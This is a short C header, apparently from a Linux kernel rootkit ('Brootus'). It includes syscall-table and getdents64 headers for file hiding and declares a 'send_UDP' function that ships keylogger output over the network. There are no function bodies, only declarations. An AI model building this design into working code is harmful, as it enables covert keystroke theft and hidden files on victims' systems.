#ifndef ENABLE_UDP_H
#define ENABLE_UDP_H
#endif

#include <linux/dirent.h>	// For getdents64

#include "hack_pi.h"
#include "syscall_table.h"

//BROOTUS_MODULE(udp);    // Macros for init_file_hiding
extern void send_UDP(char *keylog);
